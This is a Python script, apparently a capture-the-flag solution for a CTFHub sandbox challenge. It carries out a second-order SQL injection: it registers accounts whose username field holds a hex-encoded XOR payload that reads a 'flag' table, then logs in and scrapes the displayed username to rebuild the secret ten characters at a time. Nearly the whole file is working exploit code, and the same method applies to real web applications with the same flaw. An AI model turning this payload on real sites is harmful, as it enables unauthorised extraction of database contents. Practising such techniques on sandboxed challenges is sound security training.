#!/usr/bin/env python
# coding: utf-8
# hosch3n in 2020-05-25

import requests
# import string
# import time
# import re
from bs4 import BeautifulSoup

http_headers = {
    "User-Agent": "",
    "Cookie": ""
}

proxies = {
  "http": "http://127.0.0.1:8088",
}

# URL
url = "http://challenge-00d45d6f4b561ac9.sandbox.ctfhub.com:10080/"

# rqs = requests.session()
# rqs.post(url=url, headers=http_headers, proxies=proxies, data=http_data)

# 注册包体
def register(email, payload_b, password):
    register_data = {
        "email": email,
        "username": payload_b,
        "password": password
    }
    return register_data

# 登录包体
def login(email, password):
    login_data = {
        "email": email,
        "password": password
    }
    return login_data

def exploit():
    payload_a = "select * from flag"
    payload_b = f"0' ^ (select substr(hex(hex(({payload_a}))) from {guess*10+1} for 10)) ^ '0"
    email = f"{guess}@gmail.com"
    password = "CTFHub666"

    # 注册
    register_url = f"{url}register.php"
    register_data = register(email, payload_b, password)
    tmp_register = requests.post(url=register_url, data=register_data)

    # 登录
    login_url = f"{url}login.php"
    login_data = login(email, password)
    tmp_login = requests.post(url=login_url, data=login_data)

    # 解析
    html_login = tmp_login.text
    bs = BeautifulSoup(html_login, 'html.parser')
    tmp_result = bs.find('span', {'class': 'user-name'}).string.strip()
    return tmp_result

if __name__ == "__main__":
    # test_string = string.printable
    flag = ""

    # 30张牌你能秒我？
    for guess in range(30):
        tmp_flag = exploit()
        flag += tmp_flag
        print(flag)